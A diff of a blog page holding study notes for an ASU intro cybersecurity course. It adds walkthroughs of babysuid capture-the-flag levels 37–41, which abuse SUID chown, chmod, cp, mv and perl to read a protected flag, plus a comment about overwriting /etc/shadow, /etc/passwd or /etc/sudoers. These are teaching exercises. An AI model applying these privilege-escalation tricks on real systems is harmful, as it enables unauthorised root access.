@@ -336,7 +336,7 @@
 
 
                 <time class="article-words">
-                    1755 字
+                    1918 字
                 </time>
             </div>
         
@@ -350,9 +350,9 @@
     <section class="article-content">
     
     
-    <h1 id="asu-cse-365">ASU CSE 365</h1>
-<h2 id="program-misuse">Program Misuse</h2>
-<h3 id="program-interactionlinux-command-line">Program Interaction:Linux Command Line</h3>
+    <h1 id="program-misuse">Program Misuse</h1>
+<p>&mdash;&mdash;&mdash;&ndash;<strong>ASU CSE 365</strong>: Introduction to Cybersecurity</p>
+<h2 id="program-interactionlinux-command-line">Program Interaction:Linux Command Line</h2>
 <p>①	<strong>Learning the command line</strong></p>
 <ol>
 <li><a class="link" href="https://overthewire.org/wargames/bandit/"  target="_blank" rel="noopener"
@@ -392,7 +392,7 @@
 </div>
 </div><p>⑦	<strong>Input and output redirection</strong></p>
 <p><code>&lt;in_file</code>、<code>&gt;outfile</code>、<code>&gt;&gt;out_file</code>、<code>2&gt;error_file</code>、<code>2&gt;&gt;error_file</code></p>
-<h3 id="program-misuseprivilege-escalation">Program Misuse:Privilege Escalation</h3>
+<h2 id="program-misuseprivilege-escalation">Program Misuse:Privilege Escalation</h2>
 <p>①	<strong>permission model</strong></p>
 <p>Permissions: <strong>r: 4	w: 2	x: 1</strong></p>
 <p>File: first <code>rwx</code>: <strong>owner user</strong>	second <code>rwx</code>: <strong>owner group</strong>	third <code>rwx</code>: <strong>other groups</strong></p>
@@ -430,8 +430,8 @@
 </span></span><span class="line"><span class="cl">sudo chmod g+s xxx 	<span class="c1">#group:rwx---&gt;rws</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="program-misusemitigations">Program Misuse:Mitigations</h3>
-<h3 id="babysuid-challenge">babysuid challenge</h3>
+</div><h2 id="program-misusemitigations">Program Misuse:Mitigations</h2>
+<h2 id="babysuid-challenge">babysuid challenge</h2>
 <p><strong>init:</strong> we can use the Desktop or the Workspace(then change to the terminal) to operate.</p>
 <p><strong>suid:</strong> Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then <strong>when the user executes the file, the file will be executed as the  file owner</strong>, once the file is executed, the identity switch disappears.</p>
 <p>level 1-6: there&rsquo;re some simple programs that can directly read the flag：<strong>cat, more, less, tail, head, sort</strong></p>
@@ -821,7 +821,75 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
 </div>
 </div><p><code>(.,.)p:</code> Prints the addressed lines. If invoked from a terminal, <strong>ed</strong> pauses at the end of each page until a newline is entered. The current address is set to the last line printed.</p>
 <p><code>q:</code> quits ed</p>
-
+<p><strong>doing tricks with permissions</strong></p>
+<p>level 37: <strong>chown</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chown hacker:hacker flag
+</span></span><span class="line"><span class="cl">cat flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 38: <strong>chmod</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chmod <span class="m">777</span> flag
+</span></span><span class="line"><span class="cl">cat flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 39: <strong>cp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp flag /dev/stdout <span class="c1">#can read the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#if put the echo of the output to /dev/stdout, it will be sent directly to the standard output(the screen)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;xx&#34;</span> <span class="p">|</span> cp /dev/stdin flag <span class="c1">#this can write the &#39;xx&#39; to the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 40: <strong>mv</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mv /usr/bin/cat /usr/bin/mv <span class="c1"># overwrite the mv, use the mv actually run the cat</span>
+</span></span><span class="line"><span class="cl">./babysuid_level40 <span class="c1">#execute the program</span>
+</span></span><span class="line"><span class="cl">mv flag <span class="c1">#get the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#the normal way to use the &#39;mv&#39; is overwrite the /etc/shadow or /etc/passwd or /etc/sudoers</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>let you program anything</strong></p>
+<p>level 41: <strong>perl</strong>&mdash;&gt; extract the language practical statements</p>
+<blockquote>
+<p>Usage: perl [options] [program file] [para]</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">perl -ne print flag	<span class="c1">#can read the flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-n:resume the &#34;while(&lt;&gt;){..}&#34; with the program circulating</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-e:can make the Perl program run in the terminal</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -897,7 +965,7 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
         
             
         
-        共 2.09k 字 · 共 3篇文章
+        共 2.25k 字 · 共 3篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
             <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -1059,14 +1127,10 @@ Run COMMAND with an adjusted niceness, which affects process scheduling.With no 
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#program-misuse">Program Misuse</a>
-      <ol>
-        <li><a href="#program-interactionlinux-command-line">Program Interaction:Linux Command Line</a></li>
-        <li><a href="#program-misuseprivilege-escalation">Program Misuse:Privilege Escalation</a></li>
-        <li><a href="#program-misusemitigations">Program Misuse:Mitigations</a></li>
-        <li><a href="#babysuid-challenge">babysuid challenge</a></li>
-      </ol>
-    </li>
+    <li><a href="#program-interactionlinux-command-line">Program Interaction:Linux Command Line</a></li>
+    <li><a href="#program-misuseprivilege-escalation">Program Misuse:Privilege Escalation</a></li>
+    <li><a href="#program-misusemitigations">Program Misuse:Mitigations</a></li>
+    <li><a href="#babysuid-challenge">babysuid challenge</a></li>
   </ol>
 </nav>
         </div>
